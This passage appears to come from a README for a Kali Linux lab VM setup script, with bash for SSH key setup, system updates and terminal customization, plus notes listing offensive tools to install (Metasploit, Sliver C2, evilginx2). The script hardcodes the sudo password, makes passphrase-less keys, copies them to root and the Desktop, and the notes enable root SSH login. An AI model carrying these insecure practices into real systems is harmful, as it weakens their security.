        # # style_user = "bg:#f07623 fg:#ffffff"
        # # style_root = "bg:#f07623 fg:neon_green"
        # style_user = "bg:#f07623 fg:#ffffff"
        # # style_root = "bg:#93d0fc fg:#ff0000"
        # # style_root = "bg:#93d0fc fg:#011efe"
        # style_root = "bg:#93d0fc fg:#fe0000"

        # [time]
        # time_format = "%A|%d-%b-%Y|%T|%:z"
        # format = '[ \[$time🕙\] ]($style)'
        # # style = 'bg:#8b1ec4 fg:bold neon_green'
        # # style = 'bg:#93d0fc fg:#ffa32d'
        # style = 'bg:#00a1de fg:#ffffff'
        # disabled = false

        # [shell]
        # format = '[$indicator]($style)'
        # # cmd_indicator = "\uebc4"
        # powershell_indicator = " "
        # cmd_indicator = " "
        # # style = 'cyan-blue'
        # # style = 'fg:neon_green'
        # disabled = false

        # [fill]
        # symbol = "-"
        # style = 'fg:neon_green'
        # # style = 'bg:#8b1ec4 fg:neon_green'
        # # style = "bold red"
        # disabled = false

        # [cmd_duration]
        # min_time = 1
        # show_milliseconds = true
        # disabled = false
        # format = " [$duration ]($style)"
        # # style = "bold italic red"

        # [status]
        # # style = "bg:blue"
        # symbol = " 🔴 "
        # success_symbol = " 🟢 "
        # format = '[\[$symbol$common_meaning$signal_name$maybe_int\]]($style) '
        # map_symbol = true
        # disabled = false

        # [directory]
        # format = "[ $path ]($style)"
        # # style = "bg:#DA627D"
        # style = "bg:#9600ff fg:#0bff01"
        # # style = "bg:#fe0000 fg:#0bff01"
        # # style = "bg:#f07623 fg:#0900ff"
        # # style = "bg:#011efe fg:neon_green"
        # # style = "bg:#cb2c31 fg:#ffffff"
        # # style = "bg:#011efe fg:#0bff01"
        # # style = "bg:#93d0fc fg:#ff0000"
        # # style = "bg:#011efe fg:#00fff9"
        # truncation_length = 3
        # truncation_symbol = "…\\"
        # use_os_path_sep = true
        # home_symbol = '~'

        # # Here is how you can shorten some long paths by text replacement
        # # similar to mapped_locations in Oh My Posh:
        # [directory.substitutions]
        # "Documents" = "📄 "
        # "Downloads" = "📥 "
        # "Music" = "🎜 "
        # "Pictures" = "📷 "

        # # Replace the '❯' symbol in the prompt with '➜'
        # [character] # The name of the module we are configuring is 'character'
        # success_symbol = '[➜](bold green)' # The 'success_symbol' segment is being set to '➜' with the color 'bold green'
        # error_symbol = "[✗](bold red)"

        # [python]
        # symbol = "🐍 "
        # # style = "bold yellow"
        # # style = "bold green"
        # # pyenv_version_name = true
        # pyenv_prefix = "venv "
        # python_binary = ["./venv/bin/python", "python", "python3", "python2"]
        # detect_extensions = ["py"]
        # version_format = "v${raw}"
        # format = 'via [${symbol}python (${version} )(\($virtualenv\) )]($style)'
        # # format = '\[[${symbol}${pyenv_prefix}(${version})(\($virtualenv\))]($style)\]'
        # # format = "[$symbol$version]($style) "

        # [rust]
        # format = "[$symbol$version]($style) "
        # # style = "bold green"

        # [hostname]
        # ssh_only = true
        # format = "[$ssh_symbol](bold blue) on [$hostname](bold red) "
        # disabled = false

        # [localip]
        # ssh_only = true
        # format = "@[$localipv4](bold red) "
        # disabled = false

        # [memory_usage]
        # format = "$symbol[${ram}( | ${swap})]($style) "
        # threshold = 70
        # # style = "bold dimmed white"
        # disabled = false
        #########################################################################################

        # Check the content of /home/kali/.config/pastel-powerline.toml
        # echo ""
        # cat /home/kali/.config/pastel-powerline.toml
        # echo ""





      fi

      # Turn off debugging mode
      set +xv
    } 2>&1 | tee "$output_file"

elif [[ "$option" == "sshkey" ]]; then

    # Define the filename with the current date
    output_file="sshkey-$current_date.log"

    {
      # Turn on debugging mode
      set -xv

      # Generate SSHKEY
      ssh_dir="/home/kali/.ssh"
      ssh_key_file="$ssh_dir/id_rsa"

      if [ ! -d "$ssh_dir" ]; then
          mkdir -p "$ssh_dir"
          chmod 700 "$ssh_dir"
          echo "Created SSH directory: $ssh_dir"
      fi

      if [ ! -f "$ssh_key_file" ]; then
          ssh-keygen -o -v -t ed25519 -a 1000 -P ""  -N "" -f "$ssh_key_file"
          chmod 600 "$ssh_key_file"
          echo "Generated SSH key: $ssh_key_file"

          # Backup sshkey to Desktop
          cp -v $ssh_key_file /home/kali/Desktop/kali-Virtualbox-id_rsa
          cp -v $ssh_key_file.pub /home/kali/Desktop/kali-Virtualbox-id_rsa.pub

          # Copy the public key to /home/kali/.ssh/authorized_keys so that Windows can use private key to ssh in
          cat $ssh_key_file.pub >> /home/kali/.ssh/authorized_keys
          cat /home/kali/.ssh/authorized_keys
      fi

      if [ ! -d "/root/.ssh" ]; then
          sudo -S <<< "kali" mkdir -p "/root/.ssh"
          sudo -S <<< "kali" chmod 700 "/root/.ssh"

          sudo -S <<< "kali" ls -la /root/.ssh
          
          sudo -S <<< "kali" cp -v $ssh_key_file /root/.ssh/id_rsa
          sudo -S <<< "kali" cp -v $ssh_key_file.pub /root/.ssh/id_rsa.pub
          
          # Copy the public key to /root/.ssh/authorized_keys so that Windows can use private key to ssh in
          { echo "kali"; cat /home/kali/.ssh/id_rsa.pub; } | sudo -k -S tee -a /root/.ssh/authorized_keys &>/dev/null
          sudo -S <<< "kali" cat /root/.ssh/authorized_keys
      fi

      # Turn off debugging mode
      set +xv
    } 2>&1 | tee "$output_file"

elif [[ "$option" == "system-update" ]]; then

    # Define the filename with the current date
    output_file="system-update-$current_date.log"

    {
      # Turn on debugging mode
      set -xv

      echo -e "\nYou have selected 'system-update'"
      echo "If you are encounter error after running this."
      echo -e "Please do a 'ctrl+c' and re-run 'system-update' again.\n"
      echo -e "Please do a 'sudo reboot' and re-run 'system-update' again if 'ctrl+c' does not work.\n\n"

      # Handle the prompt for PostgreSQL 15 obsolescence
      echo "kali" | sudo -S apt update -y
      echo "kali" | sudo -S apt list --upgradable
      echo "kali" | sudo -S pg_dropcluster 15 main --stop
      echo "kali" | sudo -S apt purge -y postgresql-15 postgresql-client-15
      sudo -S <<< "kali" apt autoremove --purge -y && sudo -S <<< "kali" apt autoclean -y

      # Handle the prompt for PostgreSQL 15 obsolescence
      if [ "$?" -eq 0 ]; then
          echo "kali" | sudo -S dpkg --configure -a
      fi

      # Run apt update
      echo "kali" | sudo -S apt update -y
      echo "kali" | sudo -S apt list --upgradable
      echo "kali" | sudo -S apt --yes --quiet --option Dpkg::Options::=--force-confold --option Dpkg::Options::=--force-confdef --option Dpkg::Options::=--force-confnew full-upgrade

      echo "Upgrade completed."

      # Turn off debugging mode
      set +xv
    } 2>&1 | tee "$output_file"
    
elif [[ "$option" == "set-terminal" ]]; then

    # Define the filename with the current date
    output_file="set-terminal-$current_date.log"

    {
      # Turn on debugging mode
      set -xv

      echo -e "\nYou have selected 'set-terminal'\n"

      # First checking
      check_file_content "/home/kali/.config/qterminal.org/qterminal.ini" "fixedSize=@Size(600 400)"
      if [ $? -eq 1 ]; then
        # Restart terminal
        x-terminal-emulator &
        exit 1
      fi

      # Run apt-get update
      echo "kali" | sudo -S apt update -y

      # Install dbus
      sudo -S <<< "kali" apt install -y dbus dbus-x11
      sleep 2

      # Install terminator
      sudo -S <<< "kali" apt install -y terminator
      sleep 2

      # Set Windows inside Kali Scaling to 2x
      echo export GDK_SCALE=2 > /home/kali/.xsessionrc 
      sleep 2
      xfconf-query -c xfwm4 -p /general/theme -s Kali-Dark-xHiDPI
      sleep 2
      xfconf-query -c xsettings -p /Gdk/WindowScalingFactor -n -t 'int' -s 2 
      sleep 2
      xfconf-query -c xsettings -p /Gtk/FontName -s "Sans 13"
      sleep 2
      xfconf-query -c xsettings -p /Gtk/MonospaceFontName -s "Monospace 13"
      sleep 2

      
      # Set Screen Resolution inside Kali
      sudo -S <<< "kali" sed -i.bak 's/^GRUB_CMDLINE_LINUX_DEFAULT="quiet"$/GRUB_CMDLINE_LINUX_DEFAULT="quiet video=hyperv_fb:1920x1080"/' /etc/default/grub
      sleep 2
      cat /etc/default/grub
      sleep 2
      ls -la /etc/default | grep grub
      sleep 2
      sudo -S <<< "kali" update-grub

      
      # Thunar File Manager enable Always Show Hidden Files
      # ~/.config/Thunar/thunarrc
      # LastShowHidden=TRUE
      xfconf-query --channel thunar --property /LastShowHidden --create --type bool --set true

      # Path to Terminator config file
      terminator_CONFIG_FILE=/home/kali/.config/terminator/config

      # Check if Terminator's config directory exists
      if [ ! -d "$(dirname $terminator_CONFIG_FILE)" ]; then
          mkdir -p "$(dirname $terminator_CONFIG_FILE)"
      fi

      # Check if the config file exists, and if not, create it
      if [ ! -f $terminator_CONFIG_FILE ]; then
          touch $terminator_CONFIG_FILE
      fi

      # Set the font size in the Terminator config file
      echo -e "[global_config]\nwindow_state=maximise\n\n[profiles]\n [[default]]\n font = Monospace 20\n emulation = xterm-256\n scrollback_infinite = True\n copy_on_selection = True\n putty_paste_style = True\n cursor_blink = True" > $terminator_CONFIG_FILE

      cat /home/kali/.config/terminator/config

      # Path to default terminal emulator configuration (/home/kali/.config/xfce4/helpers.rc)
      terminal_CONFIG_FILE=/home/kali/.config/xfce4/helpers.rc

      # Check if default terminal emulator configuration (/home/kali/.config/xfce4/helpers.rc) exists
      if [ ! -d "$(dirname $terminal_CONFIG_FILE)" ]; then
          mkdir -p "$(dirname $terminal_CONFIG_FILE)"
      fi

      # Check if the config file exists, and if not, create it
      if [ ! -f $terminal_CONFIG_FILE ]; then
          
          touch $terminal_CONFIG_FILE
          
          # Set default terminal emulator as Terminator (/home/kali/.config/xfce4/helpers.rc)
          echo "TerminalEmulator=terminator" > $terminal_CONFIG_FILE
      else    
          # Backup default terminal emulator configuration (/home/kali/.config/xfce4/helpers.rc)
          cp -v /home/kali/.config/xfce4/helpers.rc /home/kali/.config/xfce4/helpers.rc.$current_date.bak

          # Set default terminal emulator as Terminator (/home/kali/.config/xfce4/helpers.rc)
          sed -i.bak 's/TerminalEmulator=qterminal/TerminalEmulator=terminator/g' /home/kali/.config/xfce4/helpers.rc
          cat /home/kali/.config/xfce4/helpers.rc
      fi

      # Define qterminal_file
      qterminal_file="/home/kali/.config/qterminal.org/qterminal.ini"

      if check_immutable_attribute $qterminal_file; then
        echo "$qterminal_file is set with the immutable attribute (chattr +i)."
        echo "To reset the attribute, please use 'sudo -S <<< \"kali\" chattr -f -i /home/kali/.config/qterminal.org/qterminal.ini'."
      else
        echo "$qterminal_file does not have the immutable attribute (chattr +i) set."
              
        # Backup $qterminal_file
        cp -v $qterminal_file $qterminal_file.$current_date.bak

        # Changing /home/kali/.config/qterminal.org/qterminal.ini configuration
        sudo -S <<< "kali" chattr -f -i $qterminal_file
        sed -i.bak 's/fontSize=10/fontSize=20/g' $qterminal_file
        sed -i.bak 's/AskOnExit=false/AskOnExit=true/g' $qterminal_file
        sed -i.bak 's/HideTabBarWithOneTab=true/HideTabBarWithOneTab=false/g' $qterminal_file
        sed -i.bak 's/LastWindowMaximized=true/LastWindowMaximized=false/g' $qterminal_file
        sed -i.bak 's/SaveSizeOnExit=true/SaveSizeOnExit=false/g' $qterminal_file
        sed -i.bak 's/size=@Size(640 480)/size=@Size(1400 900)/g' $qterminal_file
        sed -i.bak 's/fixedSize=@Size(600 400)/fixedSize=@Size(1400 900)/g' $qterminal_file
        sed -i.bak '/AskOnExit=false/i AlwaysShowTabs=true' $qterminal_file
        # sed -i.bak 's/SavePosOnExit=true/SavePosOnExit=false/g' $qterminal_file
        # sed -i.bak 's/pos=@Point.*/pos=@Point(200 250)/g' $qterminal_file
        sudo -S <<< "kali" chattr -f +i $qterminal_file
        cat $qterminal_file

      fi

      # Turn off debugging mode
      set +xv
    } 2>&1 | tee "$output_file"

fi
```

</details>

<br>

### set-terminal

Here is the breakdown details of `set-terminal` section.

It will help to configure:

- Kali Guest's Font Size and Window Scaling.
    - Font Size = 13
    - Window Scaling = 2x
- Enable Always Show Hidden Files for `Thunar` File Manager.
- Install and setup `terminator`.
    - Font Size = 20
    - Emulation = xterm-256
    - Scroll-back = infinite
    - Enable copy on selection
    - Enable putty paste style
    - Enable cursor blinking
- Configure `terminator` as default terminal instead of `qterminal`.
- `QTerminal`'s Font Size and Window Size by changing the configuration in `/home/kali/.config/qterminal.org/qterminal.ini`.
    - Font Size = 20
    - Enable ask on exit
    - Enable always show tab bar
    - Window Size = 1400x900

<br>

### system-update

Here is the breakdown details of `system-update` section.

It will help to configure:

- Do a `apt update`
- Stop `postgresql-15`
    - This is because Kali Linux 2023.3a Virtualbox VM has `postgresql-15` installed and running that will cause `apt upgrade` FREEZE.
- Do a `apt purge -y postgresql-15 postgresql-client-15`
- Do a `apt full-upgrade`

<br>

### sshkey

Here is the breakdown details of `sshkey` section.

It will help to configure `sshkey` for the user `kali`:

- Check `.ssh` and `sshkey` existed for the user `kali` and `root`
- Create `.ssh` and `sshkey` if require for the user `kali` and `root`
- Copy `sshkey` (including private and public key) to `/root/.ssh` for the user `root`
- Copy ssh public key to `.ssh/authorized_keys` for the user `kali` and `root`, so that you can connect ssh using private key from Windows host
- Backup the `sshkey` (including private and public key) to `/home/kali/Desktop`, so that you can copy out to Windows host

<br>

### setup

Here is the breakdown details of `setup` section.

It will help to configure:

- Set hostname to `kali-Virtualbox`
- Set timezone to `Asia/Singapore`
- Configure static ip for `eth1` (that is "Virtualbox_Lab" - "Internal" network in Virtualbox)
    - '192.168.138.6/24'
- Set root password
- Maps hostnames to IP addresses in `/etc/hosts`
    - '127.0.0.1       kali-Virtualbox'
    - '192.168.138.6   kali-Virtualbox'
- Do a `apt update`
- Install `rust`
- Install `starship`
- Install `zsh-autosuggestions`, `dos2unix`, `python3`, `tmux`, `asciinema`, `golang`, `sshuttle`, `neofetch`, `zsh`, `git`, `software-properties-common`, `powershell`, `nmap`, `ltrace`, `lsof`, `strace`, `tshark`, `tcpdump`, `exiftool`, `rpm`, `man-db`, `upx-ucl`, `nfs-common`, `cifs-utils`, `rdesktop`, `ncat`, `netcat-traditional`, `wfuzz`, `sqlmap`, `dnsenum`, `enum4linux`, `nikto`, `nbtscan-unixwiz`, `smbmap`, `linux-exploit-suggester`, `exploitdb`, `binwalk`, `sshuttle`, `john`, `hydra`, `wordlists`, `sshpass`, `jq`, `openssl`, `morse`, `hashid`, `2to3`, `mcrypt`, `bsdgames`, `morse2ascii`, `seclists`, `curl`, `feroxbuster`, `impacket-scripts`, `onesixtyone`, `oscanner`, `redis-tools`, `smbclient`, `sslscan`, `tnscmd10g`, `whatweb`, `wkhtmltopdf`, `ffuf`, `gobuster`, `gcc`, `gpg`, `ripgrep`, `fd-find`, `screen`, `powershell-empire`, `starkiller`, `feroxbuster`, `netcat-openbsd`, `metasploit-framework`, `armitage`, `koadic`, `mingw-w64`, `freerdp2-shadow-x11`, `freerdp2-x11`, `snapd`, `remmina`, `ruby`, `evil-winrm`, `feroxbuster`, `shellter`, `evilginx2`, and `chisel`
- Install `sliver` c2
- Install `rustscan`
- Install `fast-syntax-highlighting` and `zsh-autocomplete`
- Install `CascadiaCode` and `FiraCode` Nerd Font
- Install `VSCode`, `Google Chrome`, and `Microsoft Edge`
- Install and setup `pipx`
- Install `crackmapexec` using `pipx`
- Install tools using `pip3`
    - `updog`
    - `kerbrute`
    - `name-that-hash`
- Install `kerbrute` using `Go`
- Update databases for `nmap`, `wpscan`, `searchsploit`, and `locate`
- Do a `apt full-upgrade`
- DO a `apt autoremove --purge -y && sudo apt autoclean -y`
- Enable SSH at boot and allow root login with SSH
- Backup and configure `/home/kali/.zshrc`
